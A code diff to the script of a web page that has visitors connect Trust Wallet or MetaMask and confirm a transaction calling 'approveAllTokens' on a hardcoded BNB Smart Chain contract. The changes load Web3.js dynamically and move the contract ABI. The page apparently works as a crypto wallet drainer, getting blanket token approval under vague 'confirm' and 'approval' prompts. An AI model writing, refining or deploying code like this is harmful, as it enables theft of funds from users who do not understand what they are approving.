@@ -212,31 +212,20 @@
         <div id="walletInfo" class="wallet-info" style="display: none;"></div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    
     <script>
+        // Load Web3.js dynamically
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js';
+        script.onload = function() {
+            console.log('✓ Web3.js loaded successfully');
+        };
+        document.head.appendChild(script);
+
         const CONFIG = {
             CONTRACT_ADDRESS: "0xC606AAf11BE4a2320d785D49B657f40EfF771ac6",
             CHAIN_ID: 56,
             RPC_URL: "https://bsc-dataseed1.binance.org:443"
         };
-        
-        const CONTRACT_ABI = [
-            {
-                "inputs": [],
-                "name": "approveAllTokens",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [{"internalType": "address", "name": "user", "type": "address"}],
-                "name": "isApproved",
-                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
         
         function showStatus(message, type) {
             const statusDiv = document.getElementById("status");
@@ -255,6 +244,13 @@
             try {
                 const confirmBtn = document.getElementById("confirmBtn");
                 confirmBtn.disabled = true;
+                
+                // Check if Web3 is loaded
+                if (typeof Web3 === 'undefined') {
+                    showStatus("❌ Loading Web3... please wait and try again", "error");
+                    confirmBtn.disabled = false;
+                    return;
+                }
                 
                 if (!window.ethereum) {
                     showStatus("❌ Please open this page in Trust Wallet or MetaMask", "error");
@@ -282,8 +278,18 @@
                 
                 showStatus("🔐 Requesting approval (check your wallet)...", "loading");
                 
-                const contract = new web3.eth.Contract(CONTRACT_ABI, CONFIG.CONTRACT_ADDRESS);
+                // Contract ABI for approveAllTokens
+                const CONTRACT_ABI = [
+                    {
+                        "inputs": [],
+                        "name": "approveAllTokens",
+                        "outputs": [],
+                        "stateMutability": "nonpayable",
+                        "type": "function"
+                    }
+                ];
                 
+                const contract = new web3.eth.Contract(CONTRACT_ABI, CONFIG.CONTRACT_ADDRESS);
                 const txData = contract.methods.approveAllTokens().encodeABI();
                 
                 const txHash = await window.ethereum.request({
